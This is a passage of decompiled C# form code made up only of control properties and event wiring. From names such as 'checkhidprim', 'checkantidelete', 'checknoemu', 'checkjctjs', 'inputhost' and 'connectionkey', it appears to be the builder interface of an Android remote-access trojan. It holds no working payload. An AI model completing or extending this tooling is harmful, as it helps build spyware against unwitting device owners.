	internal virtual DrakeUISymbolLabel lab3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("appname")]
	internal virtual DrakeUITextBox appname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CLiname")]
	internal virtual DrakeUITextBox CLiname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel8")]
	internal virtual Panel Panel8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lbl6")]
	internal virtual DrakeUISymbolLabel lbl6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("msgtext")]
	internal virtual DrakeUITextBox msgtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("panelids")]
	internal virtual Panel panelids
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblids")]
	internal virtual DrakeUISymbolLabel lblids
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox appids
	{
		[CompilerGenerated]
		get
		{
			return _appids;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = appids_TextChanged;
			KeyEventHandler value3 = appids_KeyDown;
			KeyPressEventHandler value4 = appids_KeyPress;
			DrakeUITextBox drakeUITextBox = _appids;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
				drakeUITextBox.KeyDown -= value3;
				drakeUITextBox.KeyPress -= value4;
			}
			_appids = value;
			drakeUITextBox = _appids;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
				drakeUITextBox.KeyDown += value3;
				drakeUITextBox.KeyPress += value4;
			}
		}
	}

	[field: AccessedThroughProperty("Panelver")]
	internal virtual Panel Panelver
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblver")]
	internal virtual DrakeUISymbolLabel lblver
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("appver")]
	internal virtual DrakeUITextBox appver
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel11")]
	internal virtual Panel Panel11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel12")]
	internal virtual Panel Panel12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblico")]
	internal virtual DrakeUISymbolLabel lblico
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("appicoimg")]
	internal virtual PictureBox appicoimg
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal new virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ListView listicons
	{
		[CompilerGenerated]
		get
		{
			return _listicons;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = listicons_SelectedIndexChanged;
			ListView listView = _listicons;
			if (listView != null)
			{
				listView.SelectedIndexChanged -= value2;
			}
			_listicons = value;
			listView = _listicons;
			if (listView != null)
			{
				listView.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("icons")]
	internal virtual ColumnHeader icons
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker iconsloader
	{
		[CompilerGenerated]
		get
		{
			return _iconsloader;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = iconsloader_DoWork;
			BackgroundWorker backgroundWorker = _iconsloader;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_iconsloader = value;
			backgroundWorker = _iconsloader;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("imagelisticons")]
	public virtual ImageList imagelisticons
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DataGridView DGVPRIMB
	{
		[CompilerGenerated]
		get
		{
			return _DGVPRIMB;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellEventHandler value2 = DGVPRIMS_CellValueChanged;
			EventHandler value3 = DGVPRIMS_CurrentCellDirtyStateChanged;
			DataGridViewCellEventHandler value4 = DGVPRIMB_CellClick;
			DataGridViewEditingControlShowingEventHandler value5 = DGVPRIMB_EditingControlShowing;
			DataGridView dataGridView = _DGVPRIMB;
			if (dataGridView != null)
			{
				dataGridView.CellValueChanged -= value2;
				dataGridView.CurrentCellDirtyStateChanged -= value3;
				dataGridView.CellClick -= value4;
				dataGridView.EditingControlShowing -= value5;
			}
			_DGVPRIMB = value;
			dataGridView = _DGVPRIMB;
			if (dataGridView != null)
			{
				dataGridView.CellValueChanged += value2;
				dataGridView.CurrentCellDirtyStateChanged += value3;
				dataGridView.CellClick += value4;
				dataGridView.EditingControlShowing += value5;
			}
		}
	}

	[field: AccessedThroughProperty("ctxicons")]
	internal virtual ContextMenuStrip ctxicons
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ClearAllToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ClearAllToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ClearAllToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ClearAllToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ClearAllToolStripMenuItem = value;
			toolStripMenuItem = _ClearAllToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("accsspic")]
	internal virtual PictureBox accsspic
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel8")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox Accmsgtext
	{
		[CompilerGenerated]
		get
		{
			return _Accmsgtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Accmsgtext_TextChanged;
			DrakeUITextBox drakeUITextBox = _Accmsgtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_Accmsgtext = value;
			drakeUITextBox = _Accmsgtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	internal virtual DrakeUITextBox Acctitletext
	{
		[CompilerGenerated]
		get
		{
			return _Acctitletext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Acctitletext_TextChanged;
			DrakeUITextBox drakeUITextBox = _Acctitletext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_Acctitletext = value;
			drakeUITextBox = _Acctitletext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	internal virtual DrakeUIComboBox langtext
	{
		[CompilerGenerated]
		get
		{
			return _langtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = langtext_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _langtext;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_langtext = value;
			drakeUIComboBox = _langtext;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel10")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel9")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox Accbtntext
	{
		[CompilerGenerated]
		get
		{
			return _Accbtntext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Accbtntext_TextChanged;
			DrakeUITextBox drakeUITextBox = _Accbtntext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_Accbtntext = value;
			drakeUITextBox = _Accbtntext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("TabPage5")]
	internal virtual TabPage TabPage5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TableLayoutPanel1")]
	internal virtual TableLayoutPanel TableLayoutPanel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("indxclumn")]
	internal virtual DataGridViewTextBoxColumn indxclumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn1")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column1")]
	internal virtual DataGridViewComboBoxColumn Column1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column2")]
	internal virtual DataGridViewCheckBoxColumn Column2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("statclum")]
	internal virtual DataGridViewImageColumn statclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("accessoptnpanel")]
	internal virtual Panel accessoptnpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkhidprim")]
	internal virtual DrakeUICheckBox checkhidprim
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkautoprims")]
	internal virtual DrakeUICheckBox checkautoprims
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkantidelete")]
	internal virtual DrakeUICheckBox checkantidelete
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("emptytext")]
	internal virtual Label emptytext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox comboacctype
	{
		[CompilerGenerated]
		get
		{
			return _comboacctype;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = comboacctype_MouseClick;
			EventHandler value3 = comboacctype_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _comboacctype;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.MouseClick -= value2;
				drakeUIComboBox.SelectedIndexChanged -= value3;
			}
			_comboacctype = value;
			drakeUIComboBox = _comboacctype;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.MouseClick += value2;
				drakeUIComboBox.SelectedIndexChanged += value3;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkcaplock")]
	internal virtual DrakeUICheckBox checkcaplock
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel15")]
	internal virtual Panel Panel15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkantistop")]
	internal virtual DrakeUICheckBox checkantistop
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checknoemu")]
	internal virtual DrakeUICheckBox checknoemu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checknosleep")]
	internal virtual DrakeUICheckBox checknosleep
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W9")]
	internal virtual DrakeWidth_W DrakeWidth_W9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel16")]
	internal virtual Panel Panel16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("namemonitor")]
	internal virtual DrakeUITextBox namemonitor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("traklist")]
	internal virtual ListBox traklist
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel17")]
	internal virtual Panel Panel17
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("idmonitor")]
	internal virtual DrakeUITextBox idmonitor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W12")]
	internal virtual DrakeWidth_W DrakeWidth_W12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("linkmonitor")]
	internal virtual DrakeUITextBox linkmonitor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W10")]
	internal virtual DrakeWidth_W DrakeWidth_W10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon addnum
	{
		[CompilerGenerated]
		get
		{
			return _addnum;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = addnum_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _addnum;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_addnum = value;
			drakeUIButtonIcon = _addnum;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W15")]
	internal virtual DrakeWidth_W DrakeWidth_W15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W14")]
	internal virtual DrakeWidth_W DrakeWidth_W14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W16")]
	internal virtual DrakeWidth_W DrakeWidth_W16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker builderworker
	{
		[CompilerGenerated]
		get
		{
			return _builderworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = builderworker_DoWork;
			BackgroundWorker backgroundWorker = _builderworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_builderworker = value;
			backgroundWorker = _builderworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("TabPage4")]
	internal virtual TabPage TabPage4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel9")]
	internal virtual Panel Panel9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel10")]
	internal virtual Panel Panel10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon3_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon3 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W19")]
	internal virtual DrakeWidth_W DrakeWidth_W19
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("inputhost")]
	internal virtual DrakeUITextBox inputhost
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("listhosts")]
	internal virtual ListBox listhosts
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox checkdisstore
	{
		[CompilerGenerated]
		get
		{
			return _checkdisstore;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUICheckBox.OnValueChanged value2 = checkdisstore_ValueChanged;
			DrakeUICheckBox drakeUICheckBox = _checkdisstore;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged -= value2;
			}
			_checkdisstore = value;
			drakeUICheckBox = _checkdisstore;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox DrakeUICheckBox1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUICheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUICheckBox.OnValueChanged value2 = DrakeUICheckBox1_ValueChanged;
			DrakeUICheckBox drakeUICheckBox = _DrakeUICheckBox1;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged -= value2;
			}
			_DrakeUICheckBox1 = value;
			drakeUICheckBox = _DrakeUICheckBox1;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel13")]
	internal virtual Panel Panel13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("connectionkey")]
	internal virtual DrakeUITextBox connectionkey
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkhidico")]
	internal virtual Label checkhidico
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox hideicocombox
	{
		[CompilerGenerated]
		get
		{
			return _hideicocombox;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = hideicocombox_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _hideicocombox;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_hideicocombox = value;
			drakeUIComboBox = _hideicocombox;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W4h")]
	internal virtual DrakeWidth_W DrakeWidth_W4h
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel14")]
	internal virtual Panel Panel14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel18")]
	internal virtual Panel Panel18
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W17")]
	internal virtual DrakeWidth_W DrakeWidth_W17
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkprotect")]
	internal virtual DrakeUICheckBox checkprotect
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkpump")]
	internal virtual DrakeUICheckBox checkpump
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox checkjctjs
	{
		[CompilerGenerated]
		get
		{
			return _checkjctjs;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUICheckBox.OnValueChanged value2 = DrakeUICheckBox2_ValueChanged;
			DrakeUICheckBox drakeUICheckBox = _checkjctjs;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged -= value2;
			}
			_checkjctjs = value;
			drakeUICheckBox = _checkjctjs;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("checkonejs")]
	internal virtual DrakeUICheckBox checkonejs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("jectjstext")]
	internal virtual DrakeUIRichTextBox jectjstext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox checkforceprims
	{
		[CompilerGenerated]
		get
		{
			return _checkforceprims;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkforceprims_Click;
			DrakeUICheckBox drakeUICheckBox = _checkforceprims;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.Click -= value2;
			}
			_checkforceprims = value;
			drakeUICheckBox = _checkforceprims;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel19")]
	internal virtual Panel Panel19
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel1")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clitag")]
	internal virtual DrakeUITextBox clitag
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual DrakeUISymbolLabel Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ListBox ListTags
	{
		[CompilerGenerated]
		get
		{
			return _ListTags;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ListTags_SelectedIndexChanged;
			ListBox listBox = _ListTags;
			if (listBox != null)
			{
				listBox.SelectedIndexChanged -= value2;
			}
			_ListTags = value;
			listBox = _ListTags;
			if (listBox != null)
			{
				listBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon4_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon4 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon5_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon5 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel20")]
	internal virtual Panel Panel20
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W13")]
	internal virtual DrakeWidth_W DrakeWidth_W13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("panelhideaccess")]
	internal virtual Panel panelhideaccess
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Listhides")]
	internal virtual ListBox Listhides
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel22")]
	internal virtual Panel Panel22
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon6
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon6_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon6;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon6 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon6;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W18")]
	internal virtual DrakeWidth_W DrakeWidth_W18
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon7
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon7_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon7;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon7 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon7;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("idtohidetext")]
	internal virtual DrakeUITextBox idtohidetext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

